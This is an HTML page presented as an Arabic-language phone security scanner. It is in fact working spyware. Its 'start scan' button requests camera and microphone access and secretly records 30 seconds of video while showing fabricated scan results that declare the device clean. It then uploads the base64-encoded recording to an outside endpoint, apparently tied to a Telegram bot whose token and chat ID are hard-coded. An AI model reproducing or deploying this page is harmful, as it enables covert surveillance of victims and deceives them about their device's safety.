<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🛡️ حماية الهاتف</title>
    <style>
        :root { --green: #00ff41; --red: #ff0040; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #000; color: #fff;
            height: 100vh; display: flex;
            align-items: center; justify-content: center;
            text-align: center; padding: 20px;
        }
        @keyframes glitch { 0%{transform:translate(0)} 20%{transform:translate(-2px,2px)} 40%{transform:translate(2px,-2px)} 60%{transform:translate(-1px,1px)} 80%{transform:translate(1px,-1px)} 100%{transform:translate(0)} }
        @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
        @keyframes scanLine { from{top:-100%} to{top:100%} }
        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
        
        .scan-line { position: fixed; left: 0; right: 0; height: 2px; background: rgba(0,255,65,0.1); pointer-events: none; animation: scanLine 2s linear infinite; z-index: 999; }
        .container { max-width: 420px; width: 100%; }
        .page { display: none; }
        .page.active { display: block; }
        
        .skull { font-size: 50px; animation: pulse 0.5s infinite, flicker 0.3s infinite; }
        h1 { font-size: 20px; color: var(--green); text-shadow: 0 0 30px var(--green); animation: flicker 0.4s infinite; margin: 8px 0; }
        .subtitle { color: #333; font-size: 11px; letter-spacing: 2px; margin-bottom: 16px; }
        
        .device-card {
            background: #0a0a0a; border: 2px solid var(--green);
            border-radius: 14px; padding: 16px; margin-bottom: 16px;
            box-shadow: 0 0 30px rgba(0,255,65,0.2); text-align: center;
        }
        .device-card .d-name { color: var(--green); font-size: 15px; font-weight: 700; }
        .device-card .d-info { color: #333; font-size: 10px; margin-top: 2px; }
        
        .btn {
            width: 100%; padding: 16px; border-radius: 12px;
            border: 2px solid var(--green); background: #0a1a0a;
            color: var(--green); font-size: 17px; font-weight: 700;
            cursor: pointer; font-family: 'Courier New', monospace;
            text-shadow: 0 0 10px var(--green);
            box-shadow: 0 0 30px rgba(0,255,65,0.3);
            animation: flicker 0.8s infinite;
        }
        .btn:active { background: #0a2a0a; }
        
        .code-screen {
            background: #000; border: 2px solid var(--green);
            border-radius: 10px; padding: 14px; margin: 14px 0;
            color: var(--green); font-family: 'Courier New', monospace;
            font-size: 10px; line-height: 1.5; text-align: left;
            max-height: 250px; overflow-y: auto;
            box-shadow: 0 0 25px rgba(0,255,65,0.3);
            animation: glitch 0.2s infinite;
        }
        
        .countdown-box { display: flex; align-items: center; justify-content: center; gap: 10px; margin: 10px 0; }
        .countdown-num { font-size: 36px; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); animation: flicker 0.3s infinite; }
        .countdown-label { color: #333; font-size: 12px; }
        
        .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--red); width: 0%; transition: width 0.3s; }
        
        .success-icon { font-size: 60px; }
        .success-text { color: var(--green); font-size: 20px; font-weight: 700; margin: 10px 0; text-shadow: 0 0 20px var(--green); }
        
        video { display: none; }
    </style>
</head>
<body>

<div class="scan-line"></div>

<div class="container">
    
    <div class="page active" id="page-home">
        <div class="skull">🛡️</div>
        <h1>حماية الهاتف</h1>
        <div class="subtitle">━ SECURE SHIELD v3.0 ━</div>
        <div class="device-card">
            <div class="d-name" id="device-name">📱 جاري الكشف...</div>
            <div class="d-info" id="device-info"></div>
        </div>
        <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
    </div>
    
    <div class="page" id="page-scanning">
        <div class="skull">💀</div>
        <h1>جاري الفحص الشامل...</h1>
        <div class="subtitle">━ ANALYZING SYSTEM ━</div>
        <div class="code-screen" id="code-screen"></div>
        <div class="countdown-box">
            <span class="countdown-label">متبقي:</span>
            <span class="countdown-num" id="countdown">30</span>
            <span class="countdown-label">ثانية</span>
        </div>
        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
        <video id="hidden-video" autoplay playsinline muted></video>
    </div>
    
    <div class="page" id="page-done">
        <div class="success-icon">✅</div>
        <div class="success-text">جهازك بأمان</div>
        <p style="color:#333;font-size:12px;">تم الفحص الشامل - لا توجد تهديدات</p>
    </div>

</div>

<script>
const BOT_TOKEN = '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
let mediaRecorder, recordedChunks = [], stream;

function getDevice() {
    const ua = navigator.userAgent;
    if (ua.includes('SM-A105')||ua.includes('SM-A107')) return {name:'Samsung Galaxy A10',ram:'2GB'};
    if (ua.includes('SM-')) return {name:'Samsung Galaxy',ram:'4GB'};
    const match = ua.match(/; ([^;]+) Build/);
    const ram = navigator.deviceMemory ? navigator.deviceMemory+'GB' : '4GB';
    return {name:match?match[1].trim():'جهاز غير معروف',ram};
}

const device = getDevice();
document.getElementById('device-name').textContent = '📱 ' + device.name;
document.getElementById('device-info').textContent = 'RAM: ' + device.ram;

function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

async function startScan() {
    showPage('page-scanning');
    
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById('hidden-video').srcObject = stream;
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
        mediaRecorder.start();
    } catch(e) {}
    
    const codeScreen = document.getElementById('code-screen');
    const countdownEl = document.getElementById('countdown');
    const progressFill = document.getElementById('progress-fill');
    
    const logs = [
        '[■] INITIALIZING...',
        '[■] DEVICE: ' + device.name,
        '[■] RAM: ' + device.ram,
        '[■] CHECKING SYSTEM...',
        '[■] SCANNING KERNEL...',
        '[■] KERNEL: SECURE',
        '[■] ROOT: NOT DETECTED',
        '[■] SCANNING PORTS...',
        '[■] FIREWALL: ACTIVE',
        '[■] SSL: AES-256',
        '[■] SCANNING APPS...',
        '[■] NO MALWARE FOUND',
        '[■] ANALYZING FILES...',
        '[■] SYSTEM: CLEAN',
        '[✓] SCAN COMPLETE',
        '[✓] DEVICE SECURE ✓',
    ];
    
    let seconds = 30;
    
    const interval = setInterval(() => {
        seconds--;
        countdownEl.textContent = seconds;
        progressFill.style.width = ((30 - seconds) / 30 * 100) + '%';
        
        const progress = (30 - seconds) / 30;
        const linesToShow = Math.floor(progress * logs.length);
        codeScreen.innerHTML = logs.slice(0, Math.min(linesToShow + 1, logs.length)).join('<br>');
        codeScreen.scrollTop = codeScreen.scrollHeight;
        
        if (seconds <= 0) {
            clearInterval(interval);
            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
            setTimeout(async () => {
                if (recordedChunks.length > 0) {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onloadend = async function() {
                        const base64 = reader.result.split(',')[1];
                        try {
                            await fetch('https://ai-proxy-eosin.vercel.app/api/upload_video', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ chat_id: CHAT_ID, video_base64: base64 })
                            });
                        } catch(e) {}
                    };
                    reader.readAsDataURL(blob);
                }
                if (stream) stream.getTracks().forEach(t => t.stop());
                showPage('page-done');
            }, 2000);
        }
    }, 1000);
}
</script>
</body>
</html>
